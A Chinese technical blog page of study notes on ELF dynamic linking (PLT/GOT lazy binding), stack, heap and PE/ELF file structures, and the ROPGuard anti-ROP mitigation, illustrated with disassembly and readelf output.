<p>In fact, the execution process from the kernel looks something like the following:事实上，内核的执行过程跟下面的描述类似。</p>
<ol>
<li><code>sys_execve()</code> →.</li>
<li>Calls <code>do_execve_common()</code> →.</li>
<li>Calls <code>search_binary_handler()</code> →.</li>
<li>Calls <code>load_elf_binary()</code> →.</li>
<li>Calls <code>create_elf_tables()</code> →.</li>
</ol>
<p>The following is some of the code from <code>create_elf_tables()</code> in <code>/usr/src/linux/fs/binfmt_elf.c</code> that adds auxv entries:（这段代码会添加辅助向量条目）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">NEW_AUX_ENT(AT_PAGESZ, ELF_EXEC_PAGESIZE);</span><br><span class="line">NEW_AUX_ENT(AT_PHDR, load_addr + exec-&gt;e_phoff);</span><br><span class="line">NEW_AUX_ENT(AT_PHENT, <span class="keyword">sizeof</span>(struct elf_phdr));</span><br><span class="line">NEW_AUX_ENT(AT_PHNUM, exec-&gt;e_phnum);</span><br><span class="line">NEW_AUX_ENT(AT_BASE, interp_load_addr);</span><br><span class="line">NEW_AUX_ENT(AT_ENTRY, exec-&gt;e_entry);</span><br></pre></td></tr></table></figure>
<p>ELF的入口点和程序头地址，以及其他的值，是与内核中的NEW_AUX_ENT()宏一起入栈的。</p>
<p><strong>程序被加载进内存，辅助向量被填充好之后，控制权就交给了动态链接器。动态链接器会解析要链接到进程地址空间的用于共享库的符号和重定位。</strong></p>
<p>默认情况下，可执行文件会动态链接GNU C库 libc.so。（ps：ldd命令能显示出一个给定的可执行文件所依赖的共享库列表）。</p>
<h2 id="2-PLT-GOT"><a href="#2-PLT-GOT" class="headerlink" title="2. PLT/GOT"></a>2. PLT/GOT</h2><p>在可执行文件和共享库中可以看到PLT（procedure linkage table 过程链接表）和GOT（Global offset table 全局偏移表）。</p>
<p>当一个程序调用共享库中的函数（如strcpy()或者printf())时，需要到程序运行时，才能解析这些函数调用，那么一定存在动态链接共享库并解析共享函数地址的机制。编译器编译动态链接的程序时，会使用一种特定的方式来处理共享库函数调用，与简单的本地函数调用指令截然不同。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#//32位ELF可执行文件对libc.so的函数fgets（）进行调用的例子</span></span><br><span class="line"><span class="comment">#//32位可执行文件与GOT的关系容易观察。在32位文件中没有用到IP相对地址，IP相对地址是在64位可执行文件中使用的。</span></span><br><span class="line">objdump -d <span class="built_in">test</span></span><br><span class="line"> ...</span><br><span class="line"> 8048481:       e8 da fe ff ff          call   8048360&lt;fgets@plt&gt;</span><br><span class="line"> ...</span><br><span class="line"> <span class="comment">#//地址0x8048360对应函数fgets（）的PLT条目。</span></span><br><span class="line">********************************************************************</span><br><span class="line"> <span class="comment">#//查看0x8048360的内容，如下</span></span><br><span class="line"> objdump -d <span class="built_in">test</span> (grep <span class="keyword">for</span> 8048360)</span><br><span class="line">...</span><br><span class="line">08048360&lt;fgets@plt&gt;:                    /* A jmp into the GOT */</span><br><span class="line"> 8048360:       ff 25 00 a0 04 08       jmp    *0x804a000</span><br><span class="line"> <span class="comment">#//有一个间接跳转指向存放在0x804a000中的地址，这个地址就是GOT条目，存放着libc共享库中函数fgets（）的实际地址。</span></span><br><span class="line"> 8048366:       68 00 00 00 00          push   <span class="variable">$0x0</span></span><br><span class="line"> 804836b:       e9 e0 ff ff ff          jmp    8048350 &lt;_init+0x34&gt;</span><br><span class="line"><span class="comment">#//对函数fgets（）的调用会指向地址0x8048360，即函数fgets（）的PLT跳转表条目。</span></span><br></pre></td></tr></table></figure>
<p>然而，动态链接器采用默认的<strong>lazy linking</strong> （延迟链接方式）时，不会在函数第一次调用时就对地址进行解析。<strong>lazy linking</strong> <strong>意味着动态链接器不会在程序加载时解析每一个函数，而是在调用时通过.plt和.got.plt节（分别对应各自的过程链接表和全局偏移表）来对函数进行解析。</strong>可以通过修改LD_BIND_NOW环境变量将链接方式修改为<strong>strict linking</strong>（严格加载），以便在程序加载的同时进行动态链接。</p>
<p>动态链接器之所以默认采用lazy linking，是因为lazy Linking能够提高装载时的性能。（PS：有些安全特性，如只读重定位，只能在严格链接的模式下使用，因为.plt.got节是只读的。在动态链接器完成对.plt.got的补充之后才能够进行只读重定位，故必须使用strict linking。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#//fgets()函数的重定位条目</span></span><br><span class="line">$ readelf -r <span class="built_in">test</span></span><br><span class="line">Offset   Info      Type           SymValue    SymName</span><br><span class="line">...</span><br><span class="line">0804a000  00000107 R_386_JUMP_SLOT   00000000   fgets</span><br><span class="line">...</span><br><span class="line"><span class="comment">#//R_386_JUMP_SLOT is a relocation type for PLT/GOT entries. On x86_64, it is called R_X86_64_JUMP_SLOT.</span></span><br></pre></td></tr></table></figure>
<p> 重定位的偏移地址为0x804a000，跟fgets（）函数PLT跳转的地址相同。</p>
<p>假设函数fgets（）是第一次被调用，动态链接器需要对fgets（）的地址进行解析，并把值存入fgets（）的GOT条目中。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#//test的GOT：</span></span><br><span class="line">08049ff4 &lt;_GLOBAL_OFFSET_TABLE_&gt;:</span><br><span class="line"> 8049ff4:       28 9f 04 08 00 00       sub    %bl,0x804(%edi)</span><br><span class="line"> 8049ffa:       00 00                   add    %al,(%eax)</span><br><span class="line"> 8049ffc:       00 00                   add    %al,(%eax)</span><br><span class="line"> 8049ffe:       00 00                   add    %al,(%eax)</span><br><span class="line"> 804a000:       66 83 04 08 76          addw   <span class="variable">$0x76</span>,(%eax,%ecx,1)</span><br><span class="line"> 804a005:       83 04 08 86             addl   <span class="variable">$0xffffff86</span>,(%eax,%ecx,1)</span><br><span class="line"> 804a009:       83 04 08 96             addl   <span class="variable">$0xffffff96</span>,(%eax,%ecx,1)</span><br><span class="line"> 804a00d:       83                      .byte 0x83</span><br><span class="line"> 804a00e:       04 08                   add    <span class="variable">$0x8</span>,%al</span><br></pre></td></tr></table></figure>
<p>重点注意地址0x08048366，该地址存储在GOT的0x804a000中， 66 83 04 08 =》08048366。</p>
<p>由于链接器还没有对函数fgets（）进行解析，故该地址并不是函数的地址，而是执行函数fgets（）的PLT条目。</p>
<p>再回到PLT条目：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">08048360 &lt;fgets@plt&gt;:</span><br><span class="line"> 8048360:       ff 25 00 a0 04 08       jmp    *0x804a000</span><br><span class="line"> 8048366:       68 00 00 00 00          push   <span class="variable">$0x0</span></span><br><span class="line"> <span class="comment">#// jmp *0x804a000指令跳转到地址0x804a000中存放的0x8048366，即push $0x0指令。</span></span><br><span class="line"> <span class="comment">#// 该push指令的作用是将fgets的GOT条目入栈。</span></span><br><span class="line"> 804836b:       e9 e0 ff ff ff          jmp    8048350 &lt;_init+0x34&gt;</span><br></pre></td></tr></table></figure>
<p>fgets（）的GOT条目偏移地址0x0，对应的第一个GOT条目，是为一个共享库符号值保留的，0x0实际上是第4个GOT条目，即GOT[3]。</p>
<p>共享库的地址并不是从GOT[0]开始，而是从GOT[3]开始的，前3个条目其它用途保留。</p>
<ul>
<li>GOT[0]:存放了指向可执行文件动态段的地址，动态链接器利用该地址提取动态链接相关的信息。</li>
<li>GOT[1]:存放link_map结构的地址，动态链接器利用该地址来对符号进行解析。</li>
<li>GOT[2]:存放了指向动态链接器 _dl_runtime_resolve()函数的地址，该函数用来解析共享库函数的实际符号地址。</li>
</ul>
<p>fgets（）的PLT存根（stub）的最后一条指令是 jmp 8048350 。该地址指向可执行文件的第一个PLT条目，PLT-0；</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#//PLT-0</span></span><br><span class="line">8048350:       ff 35 f8 9f 04 08       pushl  0x8049ff8</span><br><span class="line"><span class="comment">#//将GOT[1]的地址压栈，存放link_map结构。</span></span><br><span class="line">8048356:       ff 25 <span class="built_in">fc</span> 9f 04 08       jmp    *0x8049ffc</span><br><span class="line"><span class="comment">#//jmp *0x8049ffc指令间接跳转到第三个GOT条目，GOT[2]，存放 _dl_runtime_resolve()地址，然后将控制权转给动态链接器，解析fgets（）函数的地址。</span></span><br><span class="line">804835c:       00 00                   add    %al,(%eax)</span><br></pre></td></tr></table></figure>
<p> <strong>对函数fgets进行解析后，后续所有的对PLT条目fgets的调用都会跳转到fgets的代码本身，而不是重新指向PLT，再进行一遍延迟链接的过程。</strong></p>
<p><strong>SUM++</strong>：</p>
<ol>
<li>调用fget@PLT（即调用fgets函数）</li>
<li>PLT代码做一个次到GOT地址的间接跳转。</li>
<li>GOT条目存放了指向PLT的地址，该地址存放在PUSH指令中。</li>
<li>push $0x0 指令将fgets（）GOT条目的偏移量压栈。</li>
<li>最后的fgets（）PLT指令是执行PLT-0代码的jmp指令。</li>
<li>PLT-0的第一条指令将GOT[1]的地址压栈，GOT[1]中存放了指向fgets（）的link_map结构的偏移地址。</li>
<li>PLT-0的第二条指令会跳转到GOT[2]存放的地址，该地址执行动态链接器的_dl_runtime_resolve()函数，_dl_runtime_resolve()会通过把fgets（）函数的符号值加到.got.plt节对于的GOT条目中，来处理R_386_JUMP_SLOT重定位。</li>
<li>下一次调用fgets函数时，PLT条目直接跳转到函数本身，而不是再执行一遍重定位过程。</li>
</ol>
<h2 id="3-The-dynamic-segment-revisited"><a href="#3-The-dynamic-segment-revisited" class="headerlink" title="3. The dynamic segment revisited"></a>3. The dynamic segment revisited</h2><p>动态段前面说过，有一个节头，可以通过节头来引用动态段，还可以通过程序头来引用动态段。</p>
<p>动态链接器需要在程序运行时引用动态段，但是节头不能够被加载到内存中，因此动态段需要有相关的程序头。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//动态段保存了一个由类型为ElfN_Dyn的结构体组成的数组。</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf32_Sword    d_tag;</span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">      Elf32_Word d_val;</span><br><span class="line"><span class="comment">//d_val成员保存了一个整型值，可以存放各种不同的数据，如一个重定位条目的大小。    </span></span><br><span class="line">      Elf32_Addr d_ptr;</span><br><span class="line"><span class="comment">//d_ptr成员保存了一个内存虚址，可以指向链接器需要的各种类型的地址，eg：d_tag DT_SYMTAB符号表的地址。        </span></span><br><span class="line">    &#125; d_un;</span><br><span class="line">&#125; Elf32_Dyn;</span><br></pre></td></tr></table></figure>
<p>d_tag字段保存了类型的定义参数。</p>
<p>动态链接器常用比较重要的类型值：</p>
<p>1.DT_NEEDED</p>
<p>保存了所需的共享库名的字符串表偏移。</p>
<p>2.DT_SYMTAB</p>
<p>动态符号表的地址，对应的节名 .dynsym。</p>
<p>3.DT_HASH</p>
<p>符号散列表的地址，对应的节名 .hash （有时命名为.gnu.hash）。</p>
<p>4.DT_STRTAB</p>
<p>符号字符串表的地址，对应的节名.dynstr。</p>
<p>5.DT_PLTGOT</p>
<p>全局偏移表的地址。</p>
<p>动态链接器利用ElfN_Dyn的d_tag来定位动态段的不同部分，每一部分都通过d_tag保存了指向某部分可执行文件的引用。如DT_SYMTAB保存了动态符号表的地址，对于的d_ptr给出了指向该符号标的虚址。</p>
<p>动态链接器映射到内存中时，<strong>首先会处理自身的重定位</strong>，因为链接器本身就是一个共享库。接着<strong>会查看可执行程序的动态段并查找DT_NEEDED参数，该参数保存了指向所需的共享库的字符串或者路径名。</strong>当一个共享库被映射到内存后，<strong>链接器会获取到共享库的动态段，并将共享库的符号表添加到符号表链中，符号表链存储了所有映射到内存中的共享库的符号表。</strong></p>
<p>链接器为每个共享库生成一个link_map结构的条目，并将其存入到一个链表中：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">link_map</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    ElfW(Addr) l_addr; <span class="comment">/* Base address shared object is loaded at.  */</span></span><br><span class="line">    <span class="keyword">char</span> *l_name;      <span class="comment">/* Absolute file name object was found in.  */</span></span><br><span class="line">    ElfW(Dyn) *l_ld;   <span class="comment">/* Dynamic section of the shared object.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_next</span>, *<span class="title">l_prev</span>;</span> <span class="comment">/* Chain of loaded objects.  */</span></span><br><span class="line">  &#125;;</span><br></pre></td></tr></table></figure>
<p>链接器构建完依赖列表后，会挨个处理每个库的重定位，同时会补充每个共享库的GOT。lazy linking （延迟链接）对共享库的PLT/GOT仍然适用。故，只有当一个函数真正被调用时，才会进行GOT重定位。（type <code>R_386_JMP_SLOT</code>）。</p>
<p>ps:书中内容整理不易，翻译部分来自 learning-Linux-BInary-Analysis ，全手敲，对理解elf文件编译链接的具体过程很有帮助～要不给个赞赏，不然我可要饿死街头了～</p>

      

      
    </div>
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<i class="icon-price-tags icon"></i>
		<ul class="article-tag-list">
			 
        		<li class="article-tag-list-item">
        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">reverse</a>
        		</li>
      		
		</ul>
	</div>

      

      
        <p class="article-more-link">
          <a class="article-more-a" href="/2018/07/11/The-ELF-Binary-Format/">展开全文 >></a>
        </p>
      

      
      <div class="clearfix"></div>
    </div>
  </div>
</article>

<aside class="wrap-side-operation">
    <div class="mod-side-operation">
        
        <div class="jump-container" id="js-jump-container" style="display:none;">
            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
                <i class="icon-font icon-back"></i>
            </a>
            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
                <i class="icon-font icon-plane jump-plane"></i>
            </div>
        </div>
        
        
    </div>
</aside>




  
    <article id="post-栈，堆，PE，ELF" class="article article-type-post  article-index" itemscope itemprop="blogPost">
  <div class="article-inner">
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/07/08/栈，堆，PE，ELF/">栈，堆，PE，ELF</a>
    </h1>
  

        
        <a href="/2018/07/08/栈，堆，PE，ELF/" class="archive-article-date">
  	<time datetime="2018-07-08T10:23:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-07-08</time>
</a>
        
      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="1-地址转换"><a href="#1-地址转换" class="headerlink" title="1. 地址转换"></a>1. 地址转换</h1><p><img src="/2018/07/08/栈，堆，PE，ELF/1.png" alt="1"></p>
<p>线性地址分成2/3个部分，首先用PDBR（Page Directory Base Register,页面目录基址寄存器）或CR3（Control Register 3，控制寄存器3）查找Page Directory（页面目录）。在这之后，线性地址里的第22~31位作为Page Directory里的偏移量，标识使用的Page Table（页面表）一旦找到Page Table，将用第12~21位查找PTE（Page Table Entry，页面表项）（标识使用的内存页），最后，线性地址的第0~11位用作在页面里定位请求的数据的偏移量。</p>
<h1 id="2-栈"><a href="#2-栈" class="headerlink" title="2 .栈"></a>2 .栈</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> variable_zero;</span><br><span class="line"><span class="comment">//zero，全局变量，未被初始化，编译器为其二进制文件里分配空间并填充零，位于BSS段。</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> variable_one=<span class="number">0x1234</span>;</span><br><span class="line"><span class="comment">//one，全局变量，已被初始化，编译器在二进制文件里为其分配空间，把数据保存在数据段（.data）</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="comment">//main 函数，代码段（.text）</span></span><br><span class="line">    <span class="keyword">void</span> *variable_two=<span class="built_in">malloc</span>(<span class="number">0x1234</span>);</span><br><span class="line">    <span class="comment">//指针本事是函数的一部分，动态分配的，存在于栈段之中，与函数的生命周期相同。</span></span><br><span class="line">    <span class="comment">// malloc返回的指针存在于堆中，动态分配，具有全局作用域及“use-until-free”生命周期。</span></span><br><span class="line">    [....]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>栈：所有的自动或局部变量都保存在它上面，<strong>当一个函数被调用时，任何它声明的不是静态或类似的局部变量都会在栈上分配相应的空间。</strong></p>
<p><img src="/2018/07/08/栈，堆，PE，ELF/2.png" alt="n2"></p>
<p>栈指针是esp寄存器，通常指向栈段的顶端，SS：ESP指向栈段的顶端。</p>
<p>栈帧指的是与当前正在指执行的函数有关的当前视图，当处理器进入新过程时，会执行预处理例程。</p>
<p>（procedure prologue）：首先把调用帧里下一条指令的地址压入栈，接着把当前栈的基址（EBP）保存在栈上，然后把ESP寄存器复制到EBP寄存器里，最后把ESP寄存器里的值减去一部分，从而为函数里的变量的分配空间。函数调用时，函数的参数逆序入栈。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">push ebp</span><br><span class="line">mov ebp,esp</span><br><span class="line">sub esp,0x1234</span><br></pre></td></tr></table></figure>
<p><img src="/2018/07/08/栈，堆，PE，ELF/3.png" alt="3"></p>
<p>扫尾例程：（procedure epilogue）恢复预处理所做的改变，包括调大栈指针的值（取消分配的局部变量），调用leave和ret指令（移去保存的帧指针和返回地址，并把执行流返回给调用函数）。</p>
<ul>
<li>在IA-32平台上，栈向着较小的地址增长。</li>
<li>栈以LIFO的顺序移去或增加数据。</li>
<li>局部变量及只存在与函数生命周期的变量随着栈的取消而结束。</li>
<li>每个函数都会有包含局部变量的栈帧（除非编译器故意忽略）。</li>
<li>在每个函数的栈帧之前有保存的帧指针，返回地址和例程的参数。</li>
<li>栈帧在预处理期间构造，在扫尾例程执行期间取消。</li>
</ul>
<h1 id="3-堆"><a href="#3-堆" class="headerlink" title="3.堆"></a>3.堆</h1><p>堆只是内存中的一个区段（主要供那些动态分配的变量使用，这些变量需存在与当前栈帧之外）。</p>
<p>大多数对象和应用程序使用的大量数据都会保存在堆上，堆通常是随机映射的，或是数据段的动态扩展。</p>
<p>在初始化时，堆向操作系统请求尽可能大的内存区段，然后按应用程序的需求分给小的内存块。这些块包含内联的元数据，指示块大小及其他元素，例如前一块内存的大小。</p>
<p>通过指向给定块的指针，再加上它（给定块）的大小就可以找到下一个块，或者通过把块开头地址减去前一个块的大小来发现前一个块。</p>
<p><img src="/2018/07/08/栈，堆，PE，ELF/4.png" alt="4"></p>
<p>已分配的块是通过大小来遍历（前一个快的大小，块大小，以及指示各种状态条件的元数据）</p>
<p>空闲的内存块直接通过链表遍历（指向链表里下一个空闲的内存块，指向链表里前一个内存块）</p>
<h1 id="4-PE-COFF"><a href="#4-PE-COFF" class="headerlink" title="4.PE-COFF"></a>4.PE-COFF</h1><p>Protable Executable and Common Object File Format：可移植可执行和通用对象文件格式。</p>
<p><img src="/2018/07/08/栈，堆，PE，ELF/5.png" alt="5"></p>
<p>DOS Stub：保存向后兼容。指向PE头部的偏移量。</p>
<p>从文件头开始向后偏移0x3c处就是这个偏移量，指向从文件开头偏移多少是PE头部。</p>
<p>PE头：以另外的字段标识PE文件的开始，通常是PE\0\0。在此之后是COFF文件头，该格式第一个字段是机器类型，2个字节长。<img src="/2018/07/08/栈，堆，PE，ELF/6.png" alt="6"></p>
<p>可选文件头部布局：<img src="/2018/07/08/栈，堆，PE，ELF/7.png" alt="7"></p>
<p>可选头部中COFF标准字段，Windows特定字段。</p>
<p><img src="/2018/07/08/栈，堆，PE，ELF/8.png" alt="8"></p>
<p>DLLCharacteristics：DLL特征字段，只适用于DLL，指定与DLL有关的特性。有意义的字段是0x0040，表明基地可以动态分配并允许ASLR（Address Space Layout Randomization，地址空间布局随机化），0x0080表明已经做过代码完整性检查，0x0100表明这个映像兼容NX（no-execute），最后0x0040，表明这个文件不使用SEH（Structured Exception Handling，结构化异常处理），从而预防SEH处理程序指向这个DLL，最后一个元素指定了可选头部中下一个子区段包含的元素数量。</p>
<p>数据目录：</p>
<p><img src="/2018/07/08/栈，堆，PE，ELF/9.png" alt="9"></p>
<p>输出表：指定了文件输出的函数（.edata区段）</p>
<table>
<thead>
<tr>
<th>名字</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>输出目录表</td>
<td>描述了全部的输出信息。包含了在映像中用于决定输入到输出函数的地址信息。</td>
</tr>
<tr>
<td>输出地址表</td>
<td>包含了输出入口点的地址，相关数据和绝对地址。</td>
</tr>
<tr>
<td>名字指针表</td>
<td>输出名表中对应的RVA组成的数组。</td>
</tr>
<tr>
<td>序数表</td>
<td>输出地址表的16位序数数组。</td>
</tr>
<tr>
<td>输出名表</td>
<td>已输出函数/数据等的以NULL结束的变长字符串名。</td>
</tr>
</tbody>
</table>
<p>这些表都并不需要都存在，如果输出只通过序数完成，那么只需EDT（Export Directory Table输出目录表）及EAT（Export Address Table输出地址表）。</p>
<p>输入表：（.idata区段） 输入符号时会用到三个主要结构：IDT（Import Directory Table，输入目录表），ILT（Import Lookup Table，输入查找表）和提示/名称表。</p>
<p>加载配置结构：在WinXp及更新系统中，SafeSEH用这个区段注册有效的系统异常处理程序，从而避免攻击者覆盖SEH条目，引发系统异常并执行代码的问题。如果可选头部中的DLL特性字段里的IMAGE_DLLCHARACTERISTICS_NO_SHE字段没有置位，且异常处理程序在系统试图调用它时不在这个列表里，将停止处理。</p>
<p><img src="/2018/07/08/栈，堆，PE，ELF/10.png" alt="10"></p>
<p>SecurityCookie并不是真的是cookie，而是一个指向它的指针。这个cookie有多种使用方式，最知名的就是在微软编译器中指定/GS标志时，实现栈Cookie阻止基于栈的缓冲区溢出。SEHandler table是排过序的RVA表，它对应特定映像的有效SEH处理程序。SEHandlerCount是处理程序总数。</p>
<h1 id="5-ELF"><a href="#5-ELF" class="headerlink" title="5.ELF"></a>5.ELF</h1><p>ELF（Executable and Linking Format）</p>
<p>ELF头部，没有严格规定好的大小，每部分的大小都是根据处理器的原生大小而定的，多种处理器都这样用。</p>
<p><img src="/2018/07/08/栈，堆，PE，ELF/11.png" alt="11"></p>
<p>ELF文件里每一个区段都有一个区段头部描述它，尽管存在空区段和区段本事不重叠的现象，但区段描述是连续的。区段头部的元素如图：</p>
<p><img src="/2018/07/08/栈，堆，PE，ELF/12.png" alt="12"></p>
<p>通用区段：名字前带”.“的区段是保留给系统使用的。</p>
<p><img src="/2018/07/08/栈，堆，PE，ELF/13.png" alt="13"></p>
<p>程序头部结构：程序头部表是程序头部结构的一个数组，这些结构定义了段（segment），以及怎样将二进制载入OS。表的大小及其包含的条目数量是在ELF头部中指定的。</p>
<p><img src="/2018/07/08/栈，堆，PE，ELF/14.png" alt="14"></p>
<p>p_type字段表示描述的是什么类型的段，并告诉系统怎样解释它的内容。</p>
<p>p_offset成员指定从文件头开始的段偏移量。</p>
<p>p_vaddr成员指定段的首选VA。</p>
<p>p_filesz和p_memsz元素分别表示段在物理文件和内存中的大小。</p>
<p>p_flags指定段的属性，PF_R,PF_W,PF_X分别对于读，写和执行。</p>
<p><strong>可执行映像，共享库映像，采用ASLR的映像之间的差异：</strong></p>
<p>可执行映像，为了加载可执行映像，在建立映像时必须包括每个段使用的地址，这个地址由段的p_vaddr成员指定。如果地址被改变的话，将导致对这个映像的绝对引用被中止。</p>
<p>ASLR映像和共享库映像可以通过使用所谓的PIC（Position Independent Code，位置无关代码）绕过此限制。PIC隐含的意思就是不再采用绝对引用指向某段数据，而是改为相对引用。</p>
<p>!!!之后，得好好研究研究一下，ELF文件格式了～</p>

      

      
    </div>
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<i class="icon-price-tags icon"></i>
		<ul class="article-tag-list">
			 
        		<li class="article-tag-list-item">
        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">reverse</a>
        		</li>
      		
		</ul>
	</div>

      

      
        <p class="article-more-link">
          <a class="article-more-a" href="/2018/07/08/栈，堆，PE，ELF/">展开全文 >></a>
        </p>
      

      
      <div class="clearfix"></div>
    </div>
  </div>
</article>

<aside class="wrap-side-operation">
    <div class="mod-side-operation">
        
        <div class="jump-container" id="js-jump-container" style="display:none;">
            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
                <i class="icon-font icon-back"></i>
            </a>
            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
                <i class="icon-font icon-plane jump-plane"></i>
            </div>
        </div>
        
        
    </div>
</aside>




  
    <article id="post-ROPGuard" class="article article-type-post  article-index" itemscope itemprop="blogPost">
  <div class="article-inner">
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/07/07/ROPGuard/">Anti-ROP-ROPGuard</a>
    </h1>
  

        
        <a href="/2018/07/07/ROPGuard/" class="archive-article-date">
  	<time datetime="2018-07-07T10:34:51.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-07-07</time>
</a>
        
      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="ROPGuard"><a href="#ROPGuard" class="headerlink" title="ROPGuard"></a>ROPGuard</h1><h1 id="1-EMET"><a href="#1-EMET" class="headerlink" title="1. EMET"></a>1. EMET</h1><p>EMET 全称为 Enhanced Mitigation Experience Toolkit（增强减灾体验工具），是微软发布的一款免费的漏洞缓解工具。3.0 及之前版本中，其主要特长是“强化现有的安全机制”，从 3.5 版开始则增加了一些新的实验性的探测功能。3.5版本中，有反ROP（Anti-ROP）机制。</p>
<p>ROP：最简单的理解就是将一些以返回（ret指令）结束的代码片段拼接起来，从而实现真正的逻辑。</p>
<p>之前了解过，新的操作大多有很多安全机制，ASLR（地址随机化），Exec-Shield（除存放可执行代码的内存空间以外，对其余内存空间尽量禁用执行权限DEP），StackGuard（在编译时插入检测栈数据完整性的代码）等。如何绕开安全机制：Return-into-libc（使用libc中的函数来进行攻击），ROP（利用未随机化的模块内部的汇编代码进行攻击）。</p>
<h1 id="2-Anti-ROP"><a href="#2-Anti-ROP" class="headerlink" title="2. Anti-ROP"></a>2. Anti-ROP</h1><p>BlueHatPrize中获奖的方案都与ROP有关。</p>
<p>kBouncer: Efficient and Transparent ROP Mitigation </p>
<p><a href="http://www.cs.columbia.edu/~vpappas/papers/kbouncer.pdf" target="_blank" rel="noopener">http://www.cs.columbia.edu/~vpappas/papers/kbouncer.pdf</a></p>
<p>ROPGuard - runtime prevention of return-oriented programming attacks </p>
<p><a href="http://ifsec.blogspot.jp/2012/08/my-bluehat-prize-entry-ropguard-runtime.html" target="_blank" rel="noopener">http://ifsec.blogspot.jp/2012/08/my-bluehat-prize-entry-ropguard-runtime.html</a> </p>
<p>BlueHat Prize Submission:/ROP</p>
<p><a href="https://www.vdalabs.com/tools/DeMott_BlueHat_Submission.pdf" target="_blank" rel="noopener">https://www.vdalabs.com/tools/DeMott_BlueHat_Submission.pdf</a></p>
<h1 id="3-ROPGuard"><a href="#3-ROPGuard" class="headerlink" title="3. ROPGuard"></a>3. ROPGuard</h1><p>检查：RETN所返回的目标有没有相对应的CALL。（CALL-RETN匹配性）</p>
<p>CALL？ <strong>用来调用子程序，而在子程序的结尾，大部分情况下都会执行RETN。而子程序结尾的RETN所返回的目标地址应该就是CALL指令的下面一条指令。</strong></p>
<p>Return-into-libc攻击：RETN会跳转到函数的开头；</p>
<p>ROP攻击：使用非常多的RETN；</p>
<p>导致RETN并不是返回CALL的下一条指令的情况。</p>
<p>所以，ROPGuard - runtime prevention of return-oriented programming attacks <u>本质在于关注CALL和RETN的匹配性（调用栈回溯），以此来检测ROP和Return-into-libc攻击。</u></p>
